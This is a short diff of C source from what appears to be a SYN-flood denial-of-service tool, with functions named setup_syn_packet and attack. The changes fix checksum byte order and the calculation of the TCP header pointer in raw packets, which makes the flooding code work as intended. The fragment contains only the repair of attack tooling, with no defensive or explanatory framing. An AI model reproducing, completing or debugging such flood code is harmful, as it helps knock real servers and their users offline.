@@ -174,11 +174,11 @@ void setup_syn_packet(char *packet, struct iphdr *iph, struct tcphdr *tcph, stru
     setup_tcphdr(tcph);
 
     iph->daddr = sin.sin_addr.s_addr;
-    iph->check = csum((unsigned short *)packet, iph->tot_len);
+    iph->check = htons(csum((unsigned short *)packet, iph->tot_len));
 
     tcph->dest = sin.sin_port;
 
-    tcph->check = tcpcsum(iph, tcph);
+    tcph->check = htons(tcpcsum(iph, tcph));
 }
 
 struct attack_header
@@ -207,7 +207,7 @@ void attack(void *args)
 
     char packet[MAX_PACKET_SIZE];
     struct iphdr *iph = (struct iphdr *)packet;
-    struct tcphdr *tcph = (struct tcphdr *)packet + sizeof(struct iphdr);
+    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
     struct sockaddr_in sin;
     memset(&sin, 0, sizeof(struct sockaddr_in));
     sin = arg->sin;
